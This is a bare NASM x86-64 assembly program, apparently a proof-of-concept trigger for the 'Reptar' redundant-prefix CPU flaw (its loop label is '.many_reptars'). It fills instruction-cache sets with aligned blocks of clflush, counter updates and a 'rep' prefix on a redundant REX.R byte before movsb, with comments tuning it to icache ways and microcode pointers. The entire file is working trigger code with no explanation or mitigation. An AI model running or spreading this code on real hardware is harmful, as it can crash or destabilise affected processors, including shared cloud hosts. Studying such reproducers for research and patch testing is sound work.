BITS 64

global _start

section .text
    _start:
        lea rsi, [rsp+1]
        mov rdi, rsi
        align 0x1000
        %rep 64*8
            align 64
            pause
        %endrep
        .many_reptars:
        align 0x1000
        %rep 64*8 ; icache has 8 ways 64 sets
            align 64 ; icache line size
            clflush [rdi-1] ; msrom ptr ; 4 bytes   ; 1 way
            clflush [rsi+63]; msrom ptr ; 4 bytes   ; 1 way
            dec rsi         ; 1uop      ; 3 bytes
            dec rdi         ; 1uop      ; 3 bytes
            inc rcx         ; 1uop      ; 3 bytes
            times 6 nop
            rep
            db 0x44; rex.r
            movsb           ; msrom ptr ; 3 bytes   ; 1 way
            pause           ; 1uop      ; 2 bytes
            pause           ; 1uop      ; 2 bytes
        %endrep
        nop
        times 1024 int3
